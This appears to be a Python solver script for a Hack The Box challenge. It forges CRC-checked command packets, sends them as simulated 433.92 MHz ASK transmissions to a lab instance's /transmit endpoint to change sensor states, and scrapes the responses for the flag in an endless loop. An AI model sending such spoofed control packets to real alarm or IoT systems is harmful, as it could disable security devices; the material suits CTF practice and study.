#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 142: Enviar paquetes continuamente en un loop infinito
print("[*] INNOVACIÓN 142: Continuous loop sending")

iteration = 0
while True:
    iteration += 1
    s = requests.Session()
    s.get(base_url)
    
    print(f"\n[Iteration {iteration}]")
    
    # Enviar comandos
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    time.sleep(5)
    
    # Verificar
    r = s.get(base_url)
    sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
    
    if sensor_states != ['text-warning'] * 4 + ['text-success'] * 3:
        print(f"  [!!!] STATE CHANGED!")
        print(f"       States: {sensor_states}")
    
    if 'HTB{' in r.text:
        print(f"  [SUCCESS] Flag found!")
        flags = re.findall(r'HTB\{[^}]+\}', r.text)
        for flag in flags:
            print(flag)
        break
    
    # También verificar updates
    r2 = s.get(f'{base_url}/updates')
    if 'HTB{' in r2.text:
        print(f"  [SUCCESS in updates]")
        flags = re.findall(r'HTB\{[^}]+\}', r2.text)
        for flag in flags:
            print(flag)
        break
    
    # Cada 10 iteraciones, probar algo diferente
    if iteration % 10 == 0:
        print(f"  [*] Trying variation at iteration {iteration}")
        
        # Probar con big-endian
        for addr, cmd in [(0xE1, 0xFF), (0xA1, 0xF1)]:
            data = bytes([addr, cmd])
            crc = crc16(data)
            packet = (data + struct.pack('>H', crc)).hex().upper()
            s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
        
        time.sleep(2)
        r = s.get(base_url)
        if 'HTB{' in r.text:
            print(f"  [SUCCESS with BE]")
            flags = re.findall(r'HTB\{[^}]+\}', r.text)
            for flag in flags:
                print(flag)
            break
    
    time.sleep(2)
